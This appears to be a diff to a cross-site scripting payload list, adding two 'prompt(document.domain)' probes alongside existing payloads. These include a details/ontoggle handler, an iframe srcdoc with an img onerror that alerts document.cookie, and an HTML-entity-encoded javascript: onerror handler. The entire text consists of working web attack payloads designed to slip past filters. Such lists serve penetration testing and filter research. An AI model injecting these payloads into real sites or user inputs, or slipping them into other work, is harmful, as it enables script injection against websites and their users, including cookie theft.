@@ -1,3 +1,5 @@
+"*prompt(document.domain)*"
+*prompt(document.domain)*
 <details open ontoggle="(()=>alert`ibrahimxss`)()"></details>
 <iframe srcdoc="<img src=x onerror=alert(document.cookie)>"></iframe>
 onerror="&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#41;"
